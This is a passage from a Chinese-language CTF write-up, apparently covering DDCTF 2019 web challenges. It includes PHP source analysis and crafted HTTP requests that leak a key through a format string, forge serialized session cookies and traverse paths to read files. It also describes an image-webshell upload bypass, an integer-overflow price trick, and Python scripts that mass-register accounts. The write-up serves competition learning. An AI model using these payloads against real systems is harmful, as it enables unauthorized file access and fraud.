class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure><p>审计后的总体思路如下：</p><p>主体为<code>Session.php</code>，调用了<code>Session</code>类中的<code>index</code>方法，其中<code>Session</code>类继承了<code>Application</code>类</p><p>首先，调用<code>Application</code>类中的<code>auth</code>方法，必须返回<code>true</code>才能执行下面的语句，<code>auth</code>方法返回true的条件为：<code>!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN</code>，即头部字段<code>didictf_username:admin</code>，这是个大前提</p><p>接下来调用<code>get_key</code>方法，可以发现该方法给出了注释部分的提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>提示flag和eancrykey都在<code>../config</code>文件夹下，并从<code>key.txt</code>取出加密的<code>key</code></p><p>下一步就是调用<code>session_read</code>方法，如果返回true则返回的json信息中包含<code>DiDI Welcome you $_SERVER[&#39;HTTP_USER_AGENT&#39;]</code>，如果返回false则包含信息<code>DiDI Welcome you</code>，并且调用<code>session_create</code>方法，我们继续审计<code>session_read</code>方法，在其中我们可以发现其中的if语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看出，如果执行该if语句里的内容，可以得到加密的参数<code>eancrykey</code>，我们必须要让其执行，那么这个语句前面所有的条件都必须符合：<br>（1）cookie值不能为空</p><p>（2）cookie字段中必须包含参数<code>ddctf_id</code></p><p>（3）<code>$hash === md5($this-&gt;eancrykey.$session))</code></p><p>前面两个条件都很好满足，关键在于最后一个条件，参数<code>hash</code>和<code>session</code>分别来自下列语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">$session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br></pre></td></tr></table></figure><p>我们知道，<code>substr</code>函数中的参数<code>$session</code>是来自于cookie字段中的参数<code>ddctf_id</code>的值，所以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hash = 变量session截取strlen($session)-32位 ~ 最后一位</span><br><span class="line">$session = 变量session截取 开始位 ~ strlen($session)-32位</span><br></pre></td></tr></table></figure><p>因为我们是不知道<code>eancrykey</code>的值，所以无法构造一个参数<code>session</code>能符合第三个条件，但是我们可以注意到当<code>session_read</code>方法返回false时，会执行方法<code>session_create</code>，继续跟进该方法，会发现方法的最后执行了<code>setcookie</code>，内容参数<code>$cookiedata</code>为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">$cookiedata = serialize($userdata);</span><br><span class="line">$cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br></pre></td></tr></table></figure><p>最终<code>cookiedata</code>的值即为<code>userdata</code>序列化后的值拼接上md5加密后的<code>eancrykey</code>拼接上序列化值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ddctf/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如上图所示，符合大前提<code>didictf_username</code>，但是未设置cookie值，就会执行<code>session_create</code>设置cookie值，而字段<code>ddctf_id</code>的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75ac</span><br></pre></td></tr></table></figure><p>经过url解码后为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;476e0efa4918bdfe3b0bbfdf499e75ac</span><br></pre></td></tr></table></figure><p>可以看到32位的字符串<code>476e0efa4918bdfe3b0bbfdf499e75ac</code>这个即为加密的盐（参数<code>eancrykey</code>）与序列化值<code>a:4:{s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}</code>拼接后的md5加密值，首先想到的是拿去md5解密网站上进行解密得到key，但是解密失败</p><p>虽然无法解密直接得到key，但是在<code>session_read</code>方法中，我们同样可以得到key，条件则是如前面所提到的，符合<code>$hash === md5($this-&gt;eancrykey.$session))</code></p><p>可以发现，<code>session_create</code>方法得到的<code>ddctf_id</code>字段值正好符合这个条件：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ddctf/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从响应结果来看，说明<code>session_read</code>方法返回true，说明符合了前面的所有条件，那么最后要得到key，需要的条件为POST一个参数<code>nickname</code>，该参数与key加入一个数组<code>$arr</code>，通过遍历该数组对字符串<code>Welcome my friend %s</code>进行字符替换，由于参数<code>nickname</code>为数组第一个元素，所以第一个替换的为<code>nickname</code>的值，替换一次后，要想再替换上key，则<code>nickname</code>的值中必须包含<code>%s</code>，所以，最终得到key的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /app/Session.php HTTP/1.1</span><br><span class="line">Host: 117.51.158.44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">didictf_username:admin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Cookie:ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75ac</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">nickname=%s</span><br></pre></td></tr></table></figure><p>得到的key为：<code>EzblrbNS</code></p><p>但这只是key，要想得到flag，我们必须利用前面读取出<code>key</code>的函数<code>file_get_contents</code>读取<code>../config/flag.txt</code>才能最终获取flag，这就需要利用到<code>session_read</code>方法中的反序列化语句<code>$session = unserialize($session);</code></p><p>那么接下来就需要寻找可以利用反序列化进行修改的参数，在类<code>Application</code>的方法<code>__destruct</code>中，发现语句：<code>$this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);</code>，存在可以利用的参数<code>$path</code>，追溯该参数来源，发现<code>path</code>经过函数<code>sanitizepath</code>过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且需要满足条件：<code>strlen($path) === 18</code>，才可以执行上述语句进行文件读取</p><p>所以，思路很清晰了，通过参数<code>session</code>进行反序列化改变参数<code>path</code>的值读取文件<code>../config/flag.txt</code></p><p>要进行反序列化，同样要满足我们一开始提到的得到key的三个条件，但是这里我们已经知道了key，所以很容易就可以控制参数<code>session</code></p><p>获得序列化值的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Appliacation</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session = <span class="keyword">new</span> Application();</span><br><span class="line">$session-&gt;path = <span class="string">"..././config/flag.txt"</span></span><br><span class="line"><span class="keyword">echo</span> serialize($session);</span><br></pre></td></tr></table></figure><p>获得到的序列化值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;</span><br></pre></td></tr></table></figure><p>接下来将key与序列化值进行拼接后进行md5加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&apos;EzblrbNS&apos;.$session);</span><br></pre></td></tr></table></figure><p>加密后的值为<code>5a014dbe49334e6dbb7326046950bee</code></p><p>那么session值就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee</span><br></pre></td></tr></table></figure><p>最终获取flag的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /app/Session.php HTTP/1.1</span><br><span class="line">Host: 117.51.158.44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">didictf_username:admin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Cookie:ddctf_id=O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;%3bs:21:&quot;..././config/flag.txt&quot;%3b&#125;5a014dbe49334e6dbb7326046950bee2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>flag：<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p><h4 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h4><p>题目链接：<a href="http://117.51.148.166/upload.php" target="_blank" rel="noopener">http://117.51.148.166/upload.php</a> </p><p>很清晰的一道文件上传题，尝试上传php一句话，抓包修改<code>Content-type</code>字段为<code>image/jpeg</code>，修改文件名后缀名为jpg都无法上传，提示<code>请上传JPG/GIF/PNG格式的图片文件</code>，猜测后台是对上传的文件内容进行了检查，上传图片马中包含<code>phpinfo</code>，却提示<code>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</code>，将上传后的图片下载下来，与原来图片比较发现<code>phpinfo</code>不见了，说明对上传的图片进行了二次渲染，类似于upload-labs中的一道绕过二次渲染题目</p><p>绕过二次渲染上传图片马参考地址：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><p>使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为:php jpg_payload.php 1.jpg</p><p> <img src="\img\ddctf\7.png" alt=""></p><p> 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证：</p><p> <img src="\img\ddctf\8.png" alt=""></p><p> 成功插入phpinfo信息，再次在服务器中上传该图片马</p><p> <img src="\img\ddctf\9.png" alt=""></p><p> 成功获得flag</p><p> 另外png的图片同样可以通过参考链接中的其他脚本生成图片马，gif文件则需要比较前后图片的相同之处即imagecreatefromgif函数未修改的部分，比较麻烦一点</p><p>flag：<code>DDCTF{B3s7_7ry_php1nf0_f2a042657ff79fad}</code></p><h4 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h4><p>题目链接：<a href="http://117.51.147.155:5050/index.html#/login" target="_blank" rel="noopener">http://117.51.147.155:5050/index.html#/login</a> </p><p>这题有点类似护网杯的买辣条，抓包发现Cookie带有<code>REVEL_SESSION</code>，说明是<strong>go语言</strong>，继续抓取购买吃鸡入场券的包时，发现有参数<code>ticket_price=2000</code>，可是我们的余额只有100，明显无法购买入场券，后台的代码逻辑可能为<code>用户存款 -  （吃鸡入场券数×入场券价格 ） &gt;= 0</code> ，尝试修改ticket_price=100，无法生成订单，通过二分法尝试，只有大于等于1000时才能生成订单,这就想起了go语言的最大整数溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">有符号整数类型</span><br><span class="line">int8 有符号的8位整数，范围 -128 到127</span><br><span class="line">int16 有符号的16位整数，范围 -32768 到 32767</span><br><span class="line">int32 有符号的32位整数，范围 -2147483648 到 2147483647</span><br><span class="line">int64 有符号的64位整数，范围 -9223372036854775808 到 9223372036854775807</span><br><span class="line">uint8 无符号8位整数，范围 0 到 255</span><br><span class="line">uint16 无符号16位整数，范围 0 到 65535</span><br><span class="line">uint32 无符号32位整数，范围 0 到 4294967295</span><br><span class="line">uint64 无符号64位整数，范围 0 到 18446744073709551615</span><br></pre></td></tr></table></figure><p>正如上面所列出的go语言各类整数的范围，我们一个个尝试，尝试ticket_price=4294967296，即uint32 无符号32位整数值加1时，能成功购买入场券，并且余额并没有减少，还是100，这就说明了4294967296发生了溢出，变为了0，满足上面的逻辑判断</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ddctf\10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>购买成功后，获得本账号的id和ticket，并且提示需要移除100位对手才能最终吃鸡，很明显需要我们写脚本进行注册并移除，注册100位账户的脚本register.py代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">password = <span class="string">"12345678"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1101</span>):</span><br><span class="line">    name = <span class="string">"test"</span></span><br><span class="line">    name = name + str(i)</span><br><span class="line">    url = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><p>注册100位后，我们需要再通过脚本分别对这100位用户进行登录，获取吃鸡入场券订单，购买订单，最后提取出各自分别的id和ticket，以上这些步骤都分别需要观察每个步骤的响应包json字段内容来判断是否提交成功以及提取id和ticket的信息，chiji.py代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">list_your_id = []</span><br><span class="line">list_your_ticket = []</span><br><span class="line"></span><br><span class="line">password = <span class="string">"12345678"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1200</span>):</span><br><span class="line">    name = <span class="string">"test"</span> + str(i)</span><br><span class="line">    url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">    r1 = s.get(url1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r1.text: <span class="comment">#login successfully</span></span><br><span class="line">        ticket_price = <span class="number">4294967296</span></span><br><span class="line">        url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d"</span>%(ticket_price)</span><br><span class="line">        r2 = s.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'"ticket_price":'</span> <span class="keyword">in</span> r2.text: <span class="comment">#get bill successfully</span></span><br><span class="line">            bill_id = re.findall(<span class="string">r'"bill_id":"(.*)",'</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">            url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</span><br><span class="line">            r3 = s.get(url3)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'your_id'</span> <span class="keyword">and</span> <span class="string">'your_ticket'</span> <span class="keyword">in</span> r3.text: <span class="comment">#get ticket successfully</span></span><br><span class="line">                your_id = re.findall(<span class="string">r'"your_id":(.*),"your'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">                your_ticket = re.findall(<span class="string">r'"your_ticket":"(.*)"&#125;]'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">                list_your_id.append(your_id)</span><br><span class="line">                print(list_your_id)</span><br><span class="line">                list_your_ticket.append(your_ticket)</span><br><span class="line">                print(list_your_ticket)</span><br><span class="line">    <span class="keyword">if</span> len(list_your_id) <span class="keyword">and</span> len(list_your_ticket) == <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#chiji</span></span><br><span class="line">url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=test01&amp;password=12345678"</span></span><br><span class="line">r4 = s.get(url4)</span><br><span class="line">print(r4.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    url5 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(list_your_id[i],list_your_ticket[i])</span><br><span class="line">    r5 = s.get(url5)</span><br><span class="line">    print(r5.text)</span><br></pre></td></tr></table></figure><p>经过测试，需要多次分批注册100个账号，即多次运行该脚本提交，才最终挤掉100位对手，猜测可能是存在提交信息过快导致服务器会来不及处理而导致提交失败的问题</p><p>最终吃鸡页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ddctf\11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag：<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></p><h4 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h4><p>题目链接：<a href="http://116.85.48.107:5002/d5af31f66147e857" target="_blank" rel="noopener">http://116.85.48.107:5002/d5af31f66147e857</a></p><p>题目给了服务器端源码，是一个python写的Flask框架，分析代码，通过GET方式接收我们输入的参数，格式为<code>action:ACTION;ARGS0#ARGS1#ARGS2......</code>，要得到flag就是要执行最后的函数<code>get_flag_handler</code>，当满足session中的<code>num_items</code>字段大于等于5的条件时，会返回函数<code>FLAG</code> ，即得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span 